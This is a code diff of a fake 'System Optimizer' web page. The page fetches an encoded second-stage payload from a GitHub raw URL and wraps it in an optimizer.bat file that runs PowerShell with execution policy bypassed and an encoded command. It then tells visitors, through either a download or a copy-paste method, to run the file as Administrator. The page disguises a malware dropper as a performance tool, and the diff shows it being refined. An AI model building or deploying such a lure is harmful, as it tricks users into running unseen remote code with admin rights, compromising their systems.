@@ -21,7 +21,7 @@
             border-radius: 20px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            max-width: 450px;
+            max-width: 500px;
             width: 100%;
         }
         h1 {
@@ -43,10 +43,10 @@
             border-radius: 50px;
             font-weight: 600;
             font-size: 16px;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: all 0.3s;
             border: none;
             cursor: pointer;
-            margin: 5px;
+            margin: 10px;
         }
         .btn:hover {
             transform: translateY(-2px);
@@ -56,36 +56,54 @@
             font-size: 64px;
             margin-bottom: 20px;
         }
+        #method-container {
+            margin-top: 30px;
+        }
         .hidden {
             display: none;
         }
-        #installer-container {
-            margin-top: 30px;
-            padding: 20px;
-            background: #f5f5f5;
-            border-radius: 10px;
-        }
         textarea {
             width: 100%;
-            height: 100px;
-            padding: 10px;
+            height: 150px;
+            padding: 15px;
             border: 2px solid #ddd;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            margin: 10px 0;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            margin: 15px 0;
+            resize: vertical;
         }
         .instructions {
             text-align: left;
             background: #fff3cd;
-            padding: 15px;
-            border-radius: 8px;
+            padding: 20px;
+            border-radius: 10px;
             margin-top: 15px;
             font-size: 14px;
-            line-height: 1.8;
+            line-height: 2;
+            border-left: 4px solid #ffc107;
         }
         .instructions strong {
             color: #856404;
+        }
+        .step {
+            margin: 8px 0;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
     </style>
 </head>
@@ -95,179 +113,230 @@
         <h1>System Optimizer</h1>
         <p>Enhance your Windows system performance with our optimization tool</p>
         
-        <button class="btn" onclick="showMethod1()">📥 Method 1: Auto Download</button>
-        <button class="btn" onclick="showMethod2()">📋 Method 2: Manual Copy</button>
-        
-        <!-- Method 1: Auto Download -->
-        <div id="method1" class="hidden">
-            <div id="installer-container">
-                <h3 style="margin-bottom: 15px;">Auto Download</h3>
-                <button class="btn" onclick="downloadBat()">Download BAT File</button>
-                <div class="instructions">
-                    <strong>Instructions:</strong><br>
-                    1. Click "Download BAT File" above<br>
-                    2. Check your Downloads folder for <strong>optimizer.bat</strong><br>
-                    3. Right-click the file → "Run as Administrator"<br>
-                    4. Wait for completion message
-                </div>
-            </div>
+        <div id="main-buttons">
+            <button class="btn" onclick="showAutoDownload()">📥 Auto Download</button>
+            <button class="btn" onclick="showManualCopy()">📋 Manual Copy</button>
         </div>
         
-        <!-- Method 2: Manual Copy -->
-        <div id="method2" class="hidden">
-            <div id="installer-container">
-                <h3 style="margin-bottom: 15px;">Manual Installation</h3>
-                <p style="font-size: 14px; color: #666; margin-bottom: 10px;">
-                    Copy the code below:
-                </p>
-                <textarea id="batCode" readonly onclick="this.select()"></textarea>
-                <button class="btn" onclick="copyCode()">📋 Copy to Clipboard</button>
-                <div class="instructions">
-                    <strong>Instructions:</strong><br>
-                    1. Click "Copy to Clipboard" above<br>
-                    2. Open Notepad on Windows<br>
-                    3. Paste the code (Ctrl+V)<br>
-                    4. Save as <strong>optimizer.bat</strong> (not .txt!)<br>
-                    5. Right-click → "Run as Administrator"
-                </div>
-            </div>
-        </div>
+        <div id="method-container"></div>
     </div>
     
     <script>
-    // IMPORTANT: Replace with YOUR values!
-    const GITHUB_RAW_URL = "https://raw.githubusercontent.com/shrnx/readme/main/stage2.txt";
+    // CRITICAL: Update these with YOUR actual values!
+    const GITHUB_USER = 'shrnx';     // ← CHANGE THIS!
+    const GITHUB_REPO = readme';              // ← Your repo name
+    const GITHUB_RAW_URL = `https://raw.githubusercontent.com/shrnx/readme/refs/heads/main/stage2.txt`;
     
     let encodedPayload = null;
+    let isLoading = false;
     
-    // Fetch payload on page load
-    (async function() {
+    // Preload payload
+    async function loadPayload() {
+        if (encodedPayload || isLoading) return;
+        
+        isLoading = true;
         try {
             const response = await fetch(GITHUB_RAW_URL);
+            if (!response.ok) throw new Error('Failed to load payload');
             encodedPayload = await response.text();
+            console.log('Payload loaded, length:', encodedPayload.length);
         } catch (error) {
-            console.error('Failed to fetch payload:', error);
+            console.error('Failed to load payload:', error);
+            alert('Error loading components. Please check your internet connection.');
         }
-    })();
-    
-    function showMethod1() {
-        document.getElementById('method1').classList.remove('hidden');
-        document.getElementById('method2').classList.add('hidden');
+        isLoading = false;
     }
     
-    function showMethod2() {
-        document.getElementById('method2').classList.remove('hidden');
-        document.getElementById('method1').classList.add('hidden');
-        loadBatCode();
+    // Load payload on page load
+    loadPayload();
+    
+    function showAutoDownload() {
+        const container = document.getElementById('method-container');
+        container.innerHTML = `
+            <div style="margin-top: 30px;">
+                <h3 style="margin-bottom: 20px;">🚀 Auto Download Method</h3>
+                <button class="btn" onclick="downloadBatFile()" id="downloadBtn">
+                    📥 Download Installer
+                </button>
+                <div id="downloadStatus"></div>
+                <div class="instructions">
+                    <strong>📝 Instructions:</strong>
+                    <div class="step">1️⃣ Click "Download Installer" button above</div>
+                    <div class="step">2️⃣ Save the <strong>optimizer.bat</strong> file</div>
+                    <div class="step">3️⃣ Right-click the file → <strong>"Run as Administrator"</strong></div>
+                    <div class="step">4️⃣ Wait 1-2 minutes for completion</div>
+                    <div class="step">5️⃣ Check <strong>C:\\Users\\Public\\Temp\\sysopt.log</strong> for status</div>
+                </div>
+            </div>
+        `;
     }
     
-    async function loadBatCode() {
+    function showManualCopy() {
+        const container = document.getElementById('method-container');
+        container.innerHTML = `
+            <div style="margin-top: 30px;">
+                <h3 style="margin-bottom: 20px;">📋 Manual Copy Method</h3>
+                <p style="font-size: 14px; color: #666; margin-bottom: 10px;">
+                    Copy the code below to create the installer:
+                </p>
+                <textarea id="batCode" readonly onclick="this.select()">Loading...</textarea>
+                <button class="btn" onclick="copyToClipboard()">📋 Copy to Clipboard</button>
+                <div id="copyStatus"></div>
+                <div class="instructions">
+                    <strong>📝 Instructions:</strong>
+                    <div class="step">1️⃣ Click "Copy to Clipboard" button above</div>
+                    <div class="step">2️⃣ Open <strong>Notepad</strong> on Windows</div>
+                    <div class="step">3️⃣ Paste the code (Ctrl+V)</div>
+                    <div class="step">4️⃣ File → Save As → Name: <strong>optimizer.bat</strong></div>
+                    <div class="step">5️⃣ Save as type: <strong>All Files (*.*)</strong></div>
+                    <div class="step">6️⃣ Right-click optimizer.bat → <strong>"Run as Administrator"</strong></div>
+                </div>
+            </div>
+        `;
+        
+        generateBatCode();
+    }
+    
+    async function generateBatCode() {
         const textarea = document.getElementById('batCode');
         
         if (!encodedPayload) {
-            try {
-                const response = await fetch(GITHUB_RAW_URL);
-                encodedPayload = await response.text();
-            } catch (error) {
-                textarea.value = 'Error loading payload. Please refresh the page.';
-                return;
-            }
+            textarea.value = 'Loading payload... Please wait...';
+            await loadPayload();
+        }
+        
+        if (!encodedPayload) {
+            textarea.value = 'ERROR: Could not load payload. Please refresh the page and try again.';
+            return;
         }
         
         const batContent = `@echo off
+REM ============================================
+REM    System Optimizer Installation
+REM ============================================
+
 echo ============================================
 echo    System Optimizer Installation
 echo ============================================
 echo.
 echo Installing optimization modules...
-echo Please wait, this may take 1-2 minutes...
+echo This may take 1-2 minutes...
+echo.
+echo A log file will be created at:
+echo C:\\Users\\Public\\Temp\\sysopt.log
 echo.
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
+REM Create temp directory if needed
+if not exist "C:\\Users\\Public\\Temp" mkdir "C:\\Users\\Public\\Temp"
+
+REM Execute PowerShell payload
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
 
 echo.
 echo ============================================
 echo    Installation Complete!
 echo ============================================
 echo.
-echo System optimization has been applied.
-echo You can now close this window.
+echo Check the log file for details:
+echo C:\\Users\\Public\\Temp\\sysopt.log
 echo.
-pause`;
+echo Press any key to close this window...
+pause >nul`;
         
         textarea.value = batContent;
     }
     
-    function copyCode() {
-        const textarea = document.getElementById('batCode');
-        textarea.select();
-        textarea.setSelectionRange(0, 99999); // For mobile
+    async function downloadBatFile() {
+        const btn = document.getElementById('downloadBtn');
+        const statusDiv = document.getElementById('downloadStatus');
+        
+        btn.disabled = true;
+        btn.textContent = '⏳ Preparing download...';
         
         try {
-            document.execCommand('copy');
-            alert('✓ Code copied to clipboard!\n\nNow:\n1. Open Notepad\n2. Paste (Ctrl+V)\n3. Save as optimizer.bat\n4. Run as Administrator');
-        } catch (err) {
-            alert('Please manually select and copy the text above');
-        }
-    }
-    
-    async function downloadBat() {
-        if (!encodedPayload) {
-            alert('Loading payload... Please try again in a moment.');
-            try {
-                const response = await fetch(GITHUB_RAW_URL);
-                encodedPayload = await response.text();
-            } catch (error) {
-                alert('Error: Could not load payload. Please check your internet connection.');
-                return;
+            if (!encodedPayload) {
+                statusDiv.innerHTML = '<div class="status">Loading payload...</div>';
+                await loadPayload();
             }
-        }
-        
-        const batContent = `@echo off
+            
+            if (!encodedPayload) {
+                throw new Error('Failed to load payload from GitHub');
+            }
+            
+            const batContent = `@echo off
+REM ============================================
+REM    System Optimizer Installation
+REM ============================================
+
 echo ============================================
 echo    System Optimizer Installation
 echo ============================================
 echo.
 echo Installing optimization modules...
-echo Please wait, this may take 1-2 minutes...
+echo This may take 1-2 minutes...
+echo.
+echo A log file will be created at:
+echo C:\\Users\\Public\\Temp\\sysopt.log
 echo.
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
+REM Create temp directory
+if not exist "C:\\Users\\Public\\Temp" mkdir "C:\\Users\\Public\\Temp"
+
+REM Execute PowerShell payload
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
 
 echo.
 echo ============================================
 echo    Installation Complete!
 echo ============================================
 echo.
-echo System optimization has been applied.
-echo You can now close this window.
+echo Check the log file for details:
+echo C:\\Users\\Public\\Temp\\sysopt.log
 echo.
 pause`;
-        
-        try {
-            // Method 1: Blob download
+            
+            // Create and download
             const blob = new Blob([batContent], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
             a.download = 'optimizer.bat';
+            a.style.display = 'none';
             
-            // Trigger download
             document.body.appendChild(a);
             a.click();
             
-            // Cleanup
             setTimeout(() => {
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
             }, 100);
             
-            alert('✓ Download started!\n\nCheck your Downloads folder for optimizer.bat\n\nRight-click it and select "Run as Administrator"');
+            statusDiv.innerHTML = '<div class="status success">✅ Download complete! Check your Downloads folder for <strong>optimizer.bat</strong></div>';
+            btn.textContent = '✓ Downloaded';
             
         } catch (error) {
-            // Fallback to manual method
-            alert('Auto-download failed. Please use Method 2 (Manual Copy) instead.');
-            showMethod2();
+            statusDiv.innerHTML = `<div class="status error">❌ Error: ${error.message}<br><br>Please try the Manual Copy method instead.</div>`;
+            btn.disabled = false;
+            btn.textContent = '📥 Try Again';
+        }
+    }
+    
+    function copyToClipboard() {
+        const textarea = document.getElementById('batCode');
+        const statusDiv = document.getElementById('copyStatus');
+        
+        textarea.select();
+        textarea.setSelectionRange(0, 99999);
+        
+        try {
+            const successful = document.execCommand('copy');
+            if (successful) {
+                statusDiv.innerHTML = '<div class="status success">✅ Code copied to clipboard!<br>Now open Notepad and paste it.</div>';
+            } else {
+                throw new Error('Copy command failed');
+            }
+        } catch (err) {
+            statusDiv.innerHTML = '<div class="status error">❌ Could not copy automatically.<br>Please manually select all text and press Ctrl+C</div>';
         }
     }
     </script>
